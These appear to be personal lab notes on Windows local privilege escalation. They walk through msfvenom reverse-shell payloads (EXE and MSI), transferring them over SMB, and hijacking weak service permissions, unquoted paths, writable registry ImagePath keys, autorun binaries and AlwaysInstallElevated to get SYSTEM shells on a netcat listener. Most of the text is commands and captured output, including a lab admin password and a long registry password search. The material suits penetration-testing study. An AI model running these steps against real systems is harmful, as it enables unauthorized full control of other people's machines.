# Notes for Windows PrivEsc
https://xapax.github.io/security/#attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/

## Generate a Reverse Shell Executable

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`

Transfer the reverse.exe file to the C:\\PrivEsc directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.

`$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .`

On Windows (update the IP address with your Attacker IP):
`copy \\10.10.10.10\share\reverse.exe C:\PrivEsc\reverse.exe`

Test the reverse shell by setting up a netcat listener on PentestOS:

`sudo nc -nvlp 53`

Then run the reverse shell (rsh.exe) executable on Windows and catch the shell:

`C:\PrivEsc\rsh.exe`

## Service Exploits - Insecure Service Permissions
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

icalcs
**BUILTIN\Users:(I)(F)**
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
APPLICATION PACKAGE AUTHORITY\ALL


wmic service where caption="<name_of_the_service_with_auto_startmode>" get name, caption, state, startmode


Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

```
C:\PrivEsc>accesschk.exe /accepteula -uwcqv user daclsvc
accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
    SERVICE_QUERY_STATUS
    SERVICE_QUERY_CONFIG
    SERVICE_CHANGE_CONFIG
    SERVICE_INTERROGATE
    SERVICE_ENUMERATE_DEPENDENTS
    SERVICE_START
    SERVICE_STOP
    READ_CONTROL
```

Note that the "user" account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG).

Query the service and note that it runs with **SYSTEM** privileges (SERVICE\_START\_NAME):

```
C:\PrivEsc>sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse shell (rsh.exe) executable you created:

```
C:\PrivEsc>sc config daclsvc binpath= "\"C:\PrivEsc\rsh.exe\""
sc config daclsvc binpath= "\"C:\PrivEsc\rsh.exe\""
[SC] ChangeServiceConfig SUCCESS
```

Start a listener on PentestOS and then start the service to spawn a reverse shell running with **SYSTEM privileges:**

### Victim Machine via RDP/SSH session
```
C:\PrivEsc>net start daclsvc
net start daclsvc
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.
```
### Attacker Machine
```
# nc -nvlp 53
Connection from 10.10.126.213:49802
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Service Exploits - Unquoted Service Path

Query the "unquotedsvc" service and note that it runs with **SYSTEM** privileges (SERVICE\_START\_NAME) and that the BINARY\_PATH\_NAME is unquoted and contains spaces.

```
C:\PrivEsc>sc qc unquotedsvc
sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Using accesschk.exe, note that the BUILTIN\\Users group is allowed to write to the C:\\Program Files\\Unquoted Path Service\ directory:

```
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

Copy the reverse shell (rsh.exe) executable you created to this directory and rename it Common.exe:

```
C:\Windows\system32>copy C:\PrivEsc\rsh.exe "C:\Program Files\Unquoted Path Service\Common.exe"
copy C:\PrivEsc\rsh.exe "C:\Program Files\Unquoted Path Service\Common.exe"
        1 file(s) copied.
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

### Victim Machine through RDP/SSH
```
C:\Users\user>net start unquotedsvc
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.
```

### Attacker Machine
```
# nc -nvlp 53
Connection from 10.10.126.213:49855
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
```

## Service Exploits - Weak Registry Permissions

Query the "regsvc" service and note that it runs with **SYSTEM** privileges (SERVICE\_START\_NAME).

```
C:\PrivEsc>sc qc regsvc
sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the **"NT AUTHORITY\\INTERACTIVE" group** (essentially all logged-on users):

```
C:\PrivEsc>accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
    KEY_ALL_ACCESS
  RW BUILTIN\Administrators
    KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
    KEY_ALL_ACCESS
```

Overwrite the **ImagePath** registry key to point to the reverse shell (rsh.exe) executable you created:

```
C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\rsh.exe /f
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\rsh.exe /f
The operation completed successfully.
```

Start a listener on PentestOS and then start the service to spawn a reverse shell running with **SYSTEM privileges:**

### Victim Machine via RDP/SSH

```
C:\Users\user>net start regsvc
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.
```

### Attacker Machine

```
# nc -nvlp 53
Connection from 10.10.126.213:49893
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Service Exploits - Insecure Service Executables

Query the "filepermsvc" service and note that it runs with **SYSTEM privileges (SERVICE\_START\_NAME).**

```
C:\PrivEsc>sc qc filepermsvc
sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Using accesschk.exe, note that the service binary (BINARY\_PATH\_NAME) file is writable by everyone:

```
C:\PrivEsc>accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
    FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
    FILE_ALL_ACCESS
  RW BUILTIN\Administrators
    FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
    FILE_ALL_ACCESS
  RW BUILTIN\Users
    FILE_ALL_ACCESS
```

Copy the reverse shell (rsh.exe) executable you created and replace the filepermservice.exe with it:

```
C:\PrivEsc>copy rsh.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
copy rsh.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
        1 file(s) copied.
```

Start a listener on PentestOS and then start the service to spawn a reverse shell running with SYSTEM privileges:

### Victim Machine via RDP/SSH session

```
C:\Users\user>net start filepermsvc
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.
```

### Attacker Machine

```
# nc -nvlp 53
Connection from 10.10.126.213:49929
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Registry - AutoRuns

Query the registry for AutoRun executables:

```
C:\PrivEsc>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

```
C:\PrivEsc>accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
    FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
    FILE_ALL_ACCESS
  RW BUILTIN\Administrators
    FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
    FILE_ALL_ACCESS
  RW BUILTIN\Users
    FILE_ALL_ACCESS
```

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

```
C:\PrivEsc>copy rsh.exe "C:\Program Files\Autorun Program\program.exe" /Y
copy rsh.exe "C:\Program Files\Autorun Program\program.exe" /Y
        1 file(s) copied.
```

Start a listener on PentestOS and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!

### The Attacker must open up a new RDP Session in order to get a shell

In a real world you must wait for the administrator to login.
If it requires you to login re-enter the password but as admin `admin/password123`

```
$ rdesktop 10.10.169.126

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=WIN-QBA94KB3IOF


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=WIN-QBA94KB3IOF
     Issuer: CN=WIN-QBA94KB3IOF
 Valid From: Fri Jan 29 15:44:46 2021
         To: Sat Jul 31 16:44:46 2021

  Certificate fingerprints:

       sha1: 2795c9f2263b038f58329abf883b7acd6b508262
     sha256: 963b50bcf0738db8d43ec3e85bb99d3a6b47019907c49a275b9c9ba9dfacbe6f


Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
Protocol(warning): process_pdu_logon(), Unhandled login infotype 1
Clipboard(error): xclip_handle_SelectionNotify(), unable to find a textual target to satisfy RDP clipboard text request
```
### Launch the reverse shell listener
```
# nc -nvlp 53
Connection from 10.10.169.126:49688
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>
```

## Registry - AlwaysInstallElevated

Query the register for AlwaysInstallElevated keys:

reg query
```
C:\PrivEsc>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\PrivEsc>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Note that both keys are set to 1 (0x1).

On PentestOS, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

Transfer the reverse.msi file to the C:\\PrivEsc directory on Windows (use the SMB server method from earlier).

```
$ sudo smbserver.py attacker .
[sudo] password for user: 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Start a listener on PentestOS and then run the installer to trigger a reverse shell running with **SYSTEM** privileges:

### Victim Machine

```
C:\PrivEsc>copy \\10.9.132.165\attacker\rsh.msi rsh.msi
copy \\10.9.132.165\attacker\rsh.msi rsh.msi
        1 file(s) copied.

C:\PrivEsc>msiexec /quiet /qn /i rsh.msi
msiexec /quiet /qn /i rsh.msi
```

### Attacker Machine

```
# nc -nlvp 53
Connection from 10.10.169.126:49773
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Passwords - Registry

The registry can be searched for keys and values that contain the word "password"

```
C:\PrivEsc>reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0fafd998-c8e8-42a1-86d7-7c10c664a415}
    (Default)    REG_SZ    Picture Password Enrollment UX

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
    (Default)    REG_SZ    PicturePasswordLogonProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{24954E9B-D39A-4168-A3B2-E5014C94492F}
    (Default)    REG_SZ    OOBE Upgrade Password Page

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}
    (Default)    REG_SZ    RASGCW Change Password Class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{3bfe6eb7-281d-4333-999e-e949e3621de7}
    (Default)    REG_SZ    Cert Password UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    V1PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}
    InfoTip    REG_SZ    Manages users and passwords for this computer

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}
    (Default)    REG_SZ    LogonPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{9cb233a5-a4a5-46b9-ab13-db07ce949410}
    (Default)    REG_SZ    Password retry UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{9fb45d27-dfe3-4383-b117-ab631787649a}
    (Default)    REG_SZ    Picture Password Task Handler

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell
    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{C98F3822-3658-4D75-8A25-6621665ECD56}
    (Default)    REG_SZ    HomeGroup Password Command

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{d9162b5b-ca81-476e-a310-cb32d932733c}
    (Default)    REG_SZ    Password Expired UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\IAS.ChangePassword\CurVer
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}
    (Default)    REG_SZ    IHomeGroupPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}
    (Default)    REG_SZ    _PasswordDeriveBytes

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}
    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgs

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{46ACA899-50F6-4A46-A9E3-273705CA4914}
    (Default)    REG_SZ    IPicturePasswordTaskHandler

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{53E78940-B62E-49F8-A69B-84CB8963A513}
    (Default)    REG_SZ    IPasswordOnWakeSetting

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}
    (Default)    REG_SZ    IPasswordVault

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}
    (Default)    REG_SZ    ISupportPasswordMode

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{6ab18989-c720-41a7-a6c1-feadb36329a0}
    (Default)    REG_SZ    IPasswordCredential

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{8969ba84-c62a-4938-a80a-f7869ad99630}
    (Default)    REG_SZ    Windows.Networking.UX.IEAPTLSCertPasswordUIPrompt

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{97F17EF9-284E-4992-AE46-748EF75225BB}
    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgs

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{9934b56b-2a2d-4505-9fde-4a76aa1b212f}
    (Default)    REG_SZ    Windows.Networking.UX.IPasswordChangeInputFactory

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}
    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredential

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{a38b29dd-3e53-4a2f-b6da-9bd13c58db43}
    (Default)    REG_SZ    Windows.Networking.UX.IEAPPasswordChangeUIPrompt

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{B0619C15-5B93-412E-AF8D-878F23B1A437}
    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollment

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{e10deb05-6b58-4b7b-adc8-65cb74a3553d}
    (Default)    REG_SZ    Windows.Networking.UX.IPasswordChangeInput

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
    (Default)    REG_SZ    PicturePasswordLogonProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}
    (Default)    REG_SZ    RASGCW Change Password Class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{3bfe6eb7-281d-4333-999e-e949e3621de7}
    (Default)    REG_SZ    Cert Password UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    V1PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}
    InfoTip    REG_SZ    Manages users and passwords for this computer

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}
    (Default)    REG_SZ    LogonPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{9cb233a5-a4a5-46b9-ab13-db07ce949410}
    (Default)    REG_SZ    Password retry UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell
    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{C98F3822-3658-4D75-8A25-6621665ECD56}
    (Default)    REG_SZ    HomeGroup Password Command

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{d9162b5b-ca81-476e-a310-cb32d932733c}
    (Default)    REG_SZ    Password Expired UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}
    (Default)    REG_SZ    IHomeGroupPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}
    (Default)    REG_SZ    _PasswordDeriveBytes

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}
    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgs

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{46ACA899-50F6-4A46-A9E3-273705CA4914}
    (Default)    REG_SZ    IPicturePasswordTaskHandler

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{53E78940-B62E-49F8-A69B-84CB8963A513}
    (Default)    REG_SZ    IPasswordOnWakeSetting

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}
    (Default)    REG_SZ    IPasswordVault

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}
    (Default)    REG_SZ    ISupportPasswordMode

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{6ab18989-c720-41a7-a6c1-feadb36329a0}
    (Default)    REG_SZ    IPasswordCredential

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{97F17EF9-284E-4992-AE46-748EF75225BB}
    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgs

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}
    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredential

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{B0619C15-5B93-412E-AF8D-878F23B1A437}
    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollment

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Capabilities\Roaming\FormSuggest
    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW Ask

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Authentication\AllowAadPasswordReset
    RegValueNameRedirect    REG_SZ    AllowPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Browser\AllowPasswordManager
    GPBlockingRegValueName    REG_SZ    FormSuggest Passwords

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\CredentialProviders\BlockPicturePassword
    RegValueNameRedirect    REG_SZ    BlockDomainPicturePassword

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\CredentialsUI\DisablePasswordReveal
    RegValueNameRedirect    REG_SZ    DisablePasswordReveal

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\AllowSimpleDevicePassword
    parentPolicyMajor    REG_SZ    DevicePasswordEnabled

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\AlphanumericDevicePasswordRequired
    parentPolicyMajor    REG_SZ    DevicePasswordEnabled

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\DevicePasswordExpiration
    parentPolicyMajor    REG_SZ    DevicePasswordEnabled

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\DevicePasswordHistory
    parentPolicyMajor    REG_SZ    DevicePasswordEnabled

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\MaxDevicePasswordFailedAttempts
    parentPolicyMajor    REG_SZ    DevicePasswordEnabled

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\MaxInactivityTimeDeviceLock
    parentPolicyMajor    REG_SZ    DevicePasswordEnabled

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\MinDevicePasswordComplexCharacters
    parentPolicyMajor    REG_SZ    DevicePasswordEnabled
    parentPolicyMinor    REG_SZ    AlphanumericDevicePasswordRequired

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\MinDevicePasswordLength
    parentPolicyMajor    REG_SZ    DevicePasswordEnabled

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\InternetExplorer\AllowAutoComplete
    RegValueNameRedirect    REG_SZ    FormSuggest Passwords

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\LocalPoliciesSecurityOptions\Accounts_LimitLocalAccountUseOfBlankPasswordsToConsoleLogonOnly
    RegValueNameRedirect    REG_SZ    LimitBlankPasswordUse

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\LocalPoliciesSecurityOptions\MicrosoftNetworkClient_SendUnencryptedPasswordToThirdPartySMBServers
    RegValueNameRedirect    REG_SZ    EnablePlainTextPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\RemoteDesktopServices\DoNotAllowPasswordSaving
    RegValueNameRedirect    REG_SZ    DisablePasswordSaving

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\RemoteDesktopServices\PromptForPasswordUponConnection
    RegValueNameRedirect    REG_SZ    fPromptForPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ServerManager\ServicingStorage\ServerComponentCache\RSAT-Feature-Tools-BitLocker-BdeAducExt
    DisplayName    REG_SZ    BitLocker Recovery Password Viewer
    Description    REG_SZ    BitLocker Recovery Password Viewer helps locate BitLocker Drive Encryption recovery passwords for Windows-based computers in Active Directory Domain Services (AD DS).

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ServerManager\ServicingStorage\ServerComponentCache\Web-Basic-Auth
    Description    REG_SZ    Basic authentication offers strong browser compatibility. Appropriate for small internal networks, this authentication method is rarely used on the public Internet. Its major disadvantage is that it transmits passwords across the network using an easily decrypted algorithm. If intercepted, these passwords are simple to decipher. Use SSL with Basic authentication.

